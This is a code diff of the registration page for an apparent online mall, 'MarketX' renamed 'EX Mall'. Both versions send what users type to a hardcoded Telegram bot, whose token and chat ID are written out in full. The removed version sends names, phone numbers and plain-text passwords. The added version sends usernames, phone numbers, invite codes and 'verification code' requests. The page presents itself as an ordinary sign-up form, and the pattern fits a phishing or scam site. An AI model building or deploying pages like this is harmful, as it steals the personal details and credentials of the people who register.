@@ -3,49 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MarketX - Register</title>
+    <title>Register | EX Mall</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #001f3f; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: white; }
-        .register-box { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 20px; backdrop-filter: blur(10px); width: 320px; border: 1px solid rgba(255,255,255,0.2); text-align: center; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        body {
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
+            background: #f4f7f9; color: #333;
+        }
+        .header { padding: 20px; display: flex; align-items: center; background: white; }
+        .back-btn { font-size: 20px; text-decoration: none; color: #333; margin-right: 15px; }
+        
+        .container { padding: 20px; }
+        h2 { font-size: 24px; margin-bottom: 5px; }
+        p { color: #888; font-size: 14px; margin-bottom: 30px; }
+
+        .input-box { background: white; border-radius: 12px; padding: 5px 15px; margin-bottom: 15px; border: 1px solid #eee; display: flex; align-items: center; }
+        .input-box input { border: none; padding: 15px; width: 100%; outline: none; font-size: 15px; }
+        .send-btn { color: #0d47a1; font-weight: bold; cursor: pointer; white-space: nowrap; border-left: 1px solid #eee; padding-left: 15px; }
+
+        .btn-register { width: 100%; padding: 15px; background: #0d47a1; border: none; border-radius: 30px; color: white; font-weight: bold; font-size: 16px; margin-top: 30px; cursor: pointer; }
+        
+        .terms { display: flex; align-items: center; gap: 10px; font-size: 12px; margin-top: 20px; color: #666; }
+        .terms input { width: 18px; height: 18px; }
     </style>
 </head>
 <body>
-    <div class="register-box">
-        <h2>MarketX Register</h2>
-        <form id="regForm">
-            <input type="text" id="name" placeholder="Full Name" required>
-            <input type="text" id="phone" placeholder="Phone Number" required>
-            <input type="password" id="pass" placeholder="Password" required>
-            <button type="submit" class="btn">Register Now</button>
-        </form>
+
+    <div class="header">
+        <a href="index.html" class="back-btn">←</a>
+        <span style="font-weight: bold;">Register</span>
     </div>
 
-    <script>
-        document.getElementById('regForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // --- ပြင်ဆင်ရန်နေရာ ---
-            const token = "8444757495:AAG6kOwh8r_hHFyyRWcXctnK0Ym1Z7pKbzU"; 
-            const chat_id = "6698333806";
-            // ---------------------
+    <div class="container">
+        <h2>Create Account</h2>
+        <p>Please fill in the details to register.</p>
 
-            const name = document.getElementById('name').value;
-            const phone = document.getElementById('phone').value;
-            const pass = document.getElementById('pass').value;
+        <div class="input-box">
+            <input type="text" id="username" placeholder="Please input your account name">
+        </div>
 
-            const message = `🔔 အေးဂျင့်အသစ် မှတ်ပုံတင်လာပါသည် \n\n👤 နာမည်: ${name} \n📞 ဖုန်း: ${phone} \n🔑 Password: ${pass}`;
+        <div class="input-box">
+            <input type="text" id="phone" placeholder="Telephone number">
+        </div>
 
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+        <div class="input-box">
+            <input type="text" id="vcode" placeholder="Verification Code">
+            <div class="send-btn" onclick="sendVCode()">Send</div>
+        </div>
 
-            fetch(url).then(response => {
-                if(response.ok) {
-                    alert("မှတ်ပုံတင်ခြင်း အောင်မြင်ပါသည်။ သင့်အကောင့်ကို စစ်ဆေးပြီးနောက် အကြောင်းပြန်ပါမည်။");
-                    window.location.href = "index.html";
-                }
-            });
+        <div class="input-box">
+            <input type="password" id="pass" placeholder="Please enter password">
+        </div>
+
+        <div class="input-box">
+            <input type="password" id="confirm_pass" placeholder="Confirm password">
+        </div>
+
+        <div class="input-box">
+            <input type="text" id="invite" placeholder="Please enter the invitation code">
+        </div>
+
+        <div class="terms">
+            <input type="checkbox" checked>
+            <span>I have read and agreed to the <a href="#" style="color:#0d47a1; text-decoration:none;">User Agreement</a></span>
+        </div>
+
+        <button class="btn-register" onclick="handleRegister()">Register</button>
+    </div>
+
+   <script>
+    function sendVCode() {
+        const phone = document.getElementById('phone').value;
+        if(!phone) {
+            alert("Please enter phone number first!");
+            return;
+        }
+
+        // Telegram Bot Configuration
+        const botToken = "8444757495:AAG6kOwh8r_hHFyyRWcXctnK0Ym1Z7pKbzU";
+        const chatId = "6698333806";
+        
+        const msg = `📩 **Verification Code Request**\n\n` +
+                    `📱 Phone: ${phone}\n` +
+                    `🕒 Time: ${new Date().toLocaleString()}\n` +
+                    `💬 Status: Waiting for Code`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+        .then(() => {
+            alert("Request sent! Admin will contact you with the code.");
         });
-    </script>
-</body>
-</html>
+    }
+
+    function handleRegister() {
+        const username = document.getElementById('username').value;
+        const phone = document.getElementById('phone').value;
+        const invite = document.getElementById('invite').value;
+
+        if(!username || !phone) {
+            alert("Please fill all required fields!");
+            return;
+        }
+
+        const botToken = "8444757495:AAG6kOwh8r_hHFyyRWcXctnK0Ym1Z7pKbzU";
+        const chatId = "6698333806";
+
+        const msg = `🆕 **NEW REGISTRATION** 🆕\n\n` +
+                    `👤 Name: ${username}\n` +
+                    `📞 Phone: ${phone}\n` +
+                    `🎫 Invite Code: ${invite}\n` +
+                    `✅ Status: Registered`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+        .then(() => {
+            alert("Registration Successful!");
+            window.location.href = "index.html";
+        });
+    }
+</script>
